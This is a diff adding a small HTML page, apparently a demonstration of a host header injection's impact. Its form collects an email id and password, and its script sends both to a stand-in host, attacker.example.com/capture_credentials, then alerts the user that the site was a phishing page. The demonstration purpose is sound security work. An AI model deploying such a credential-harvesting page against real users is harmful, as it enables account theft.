@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Host Header Injection Impact</title>
+</head>
+<body>
+    <h1>Host Header Injection Impact</h1>
+    <p>A simple demostration on host header injection bug</p>
+
+    <form id="inputForm">
+        <label for="googleId">Email id:</label>
+        <input type="text" id="googleId" name="googleId" required><br><br>
+
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required><br><br>
+
+        <button type="button" onclick="sendData()">Submit</button>
+    </form>
+
+    <script>
+        var attackerServer = "https://attacker.example.com";
+
+        function sendData() {
+            var googleId = document.getElementById("googleId").value;
+            var password = document.getElementById("password").value;
+
+
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", attackerServer + "/capture_credentials");
+            xhr.setRequestHeader("Content-Type", "application/json");
+            var data = JSON.stringify({ googleId: googleId, password: password });
+            xhr.send(data);
+
+            alert("Your been fooled by an attacker its a phshing site");
+        }
+    </script>
+</body>
+</html>
+
